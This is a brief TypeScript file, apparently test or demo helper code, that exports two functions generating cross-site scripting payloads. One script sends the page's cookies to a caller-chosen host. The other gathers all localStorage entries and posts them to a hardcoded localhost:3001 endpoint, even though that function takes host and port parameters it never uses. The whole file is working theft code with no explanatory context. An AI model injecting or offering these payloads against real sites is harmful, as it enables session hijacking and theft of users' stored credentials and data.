export function getDangerousScript(host: string, port: number) {
  let script = "<script type='application/javascript'>"
  script += 'var cookie = document.cookie; '
  script += 'var xhr = new XMLHttpRequest(); '
  script += `xhr.open('POST', 'http://${host}:${port}/save-cookie', true); `
  script += "xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); "
  script += "xhr.send('cookie=' %2B cookie); "
  script += '</script>'

  return script
}

export function getDangerousLocalStorageScript(host: string, port: number) {
  let script = "<script type='application/javascript'>"
  script += 'var entries = {}; '
  script += 'for (var i = 0; i < localStorage.length; i++) { '
  script += 'var key = localStorage.key(i); '
  script += 'entries[key] = localStorage.getItem(key); '
  script += '} '
  script += 'var xhr = new XMLHttpRequest(); '
  script += "xhr.open('POST', 'http://localhost:3001/save-storage', true); "
  script += "xhr.setRequestHeader('Content-Type', 'application/json'); "
  script += 'xhr.send(JSON.stringify(entries));'
  script += '</script>'

  return script
}